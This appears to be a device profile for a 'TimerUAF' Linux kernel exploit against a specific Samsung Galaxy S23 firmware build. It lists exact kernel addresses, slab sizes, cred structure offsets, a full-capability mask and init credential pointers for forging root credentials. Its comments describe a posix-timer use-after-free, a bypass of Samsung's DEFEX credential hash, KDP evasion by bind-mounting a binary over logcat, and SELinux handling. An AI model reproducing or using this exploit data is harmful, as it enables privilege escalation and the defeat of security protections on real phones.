# TimerUAF kernel profile: Samsung Galaxy S23 (SM-S911B, s23 / EUX)
#
# Samsung mode profile, the second 5.15 Samsung member after the A15 5G
# (a15xzh), and the first S23-series one.  Same shape as the A15 profile:
# generic timer-UAF trigger plus the Samsung vendor endgame:
#
#   - Samsung DEFEX creds_fast_hash bypass (defex_creds_hash below)
#   - worker moves to u:r:init:s0 and bind-mounts the bundled diabl0w/KernelSU
#     ksud over /system/bin/logcat so KDP does not SIGKILL a direct exec
#   - ksud late-load pinned to the diabl0w/KernelSU manager package
#     (me.weishu.kernelsu, versionName samsung-v*), no manager discovery
#   - SELinux is left to ksud's own restore (no userspace re-enforce)
#
# Every constant is derived from the factory boot.img of
# SM-S911B_5_20260928230031_bjjqs8mtoo_fac.zip.enc4 (AP
# S911BXXUAGZIF_S911BXXUAGZIF_MQB115377178_REV00, EUX, kernel
# 5.15.197-android13-8-34343818-abS911BXXUAGZIF, Android 17).  The release is
# the full banner incl. the ab firmware suffix: the S23+ / S23 Ultra share the
# 34343818 build number but ship different ab strings and different text
# layouts (their Image sha256s differ), and a different ab suffix is a
# different kernel.
#
#   5.15 init_posix_timers (__initstub__kmod_posix_timers__401_281):
#       kmem_cache_create_usercopy("posix_timers_cache", 0x108, ...)
#   do_timer_create:
#       ldr x0, [posix_timers_cache 0xffffffc00acde768]; bl kmem_cache_alloc at
#       0xffffffc008206cb0 -> return 0xffffffc008206cb4
#   copy_process (bl at 0xffffffc0080c8348) calls dup_task_struct, whose
#       bl kmem_cache_alloc(task_struct_cachep) at 0xffffffc0080c9f70 returns
#       to 0xffffffc0080c9f74 -> low21 0xc9f74 (5.15 has no
#       kmem_cache_alloc_node here)
#   fork_init: kmem_cache_create_usercopy("task_struct", 0x1200, 64, ...);
#       arch_task_struct_size is absent, so task_alloc_bytes stays 0x1200
#   cred_init: kmem_cache_create_usercopy("cred_jar", 0xb0, ...,
#       SLAB_HWCACHE_ALIGN) -> 4-byte usage, object 0xc0
#   get_task_creds: pid <= 0x8000 indexes creds_fast_hash directly as an
#       8-byte pointer array (cmp w26, #0x8, lsl #12); creds_fast_hash is its
#       own symbol at creds_hash + 0x40000 (creds_hash 0xffffffc00adcf770)
#
# Vulnerability: fs/exec.c begin_new_exec() still calls posix_cpu_timers_exit()
# (0xffffffc0084cb240) after exec_mmap (0xffffffc0084cb224) and before
# exit_itimers (0xffffffc0084cb250) -- the vulnerable order.
#
# CONFIG (embedded IKCONFIG): ARM64_4K_PAGES=y, ARM64_VA_BITS=39,
# SECURITY_DEFEX=y, KDP=y, KDP_CRED=y, SLUB=y.  SELinux is the first cred-blob
# LSM (capability, safesetid, integrity, selinux; only selinux has lbs_cred
# 32); DEFEX registers no cred blob.
release_prefix = "5.15.197-android13-8-34343818-abS911BXXUAGZIF"
schema_version = 1
ksu_kmi = "android13-5.15"

# Samsung endgame switches.
samsung_mode = 1
samsung_package = "me.weishu.kernelsu"
# creds_fast_hash: direct 8-byte pointer array indexed by pid.
defex_creds_hash = 0xffffffc00ae0f770

# 4K-page build.
page_size = 4096
page_shift = 12
slab_order = 1
slab_size = 8192
linear_min = 0xffffff0000000000
linear_max = 0xffffffc000000000

# 5.15 frees the order-1 slab through the PCP lists.
pcp_free = 1
alloc_req_off = 0x10

# do_timer_create -> kmem_cache_alloc(posix_timers_cache) return address.
timer_site = 0xffffffc008206cb4
timer_alloc = 0x108
timer_node_off = 0x78

# cred_jar: sizeof(struct cred)=0xb0, HWCACHE_ALIGN bytes_alloc=0xc0.
cred_req = 0xb0
cred_alloc = 0xc0
cred_size = 0xb0
cred_uid_off = 0x4
cred_euid_off = 0x14
cred_cap_off = 0x28
cred_cap_count = 5
cred_security_off = 0x78
cred_user_off = 0x80
cred_userns_off = 0x88
cred_ucounts_off = 0x90
cred_group_off = 0x98
fake_cred_off = 0x18

# Link-time symbols (kallsyms).
selinux_state = 0xffffffc00ad8e600
panic_on_warn = 0xffffffc00aa8add0

# task_struct / cred layout (BTF).
task_cred_off = 0x798
copy_process_low21 = 0xc9f74
task_alloc_bytes = 0x1200

# Capability and fake-cred refcounted sub-objects.
fullcap = 0x1ffffffffff
root_user = 0xffffffc00aab16d0
init_user_ns = 0xffffffc00ac294c0
init_ucounts = 0xffffffc00aab2ae8
init_groups = 0xffffffc00aab2770

# task_security_struct: SELinux is the first cred-blob LSM here.
selinux_blob_off = 0x0
selinux_sid_kernel = 1
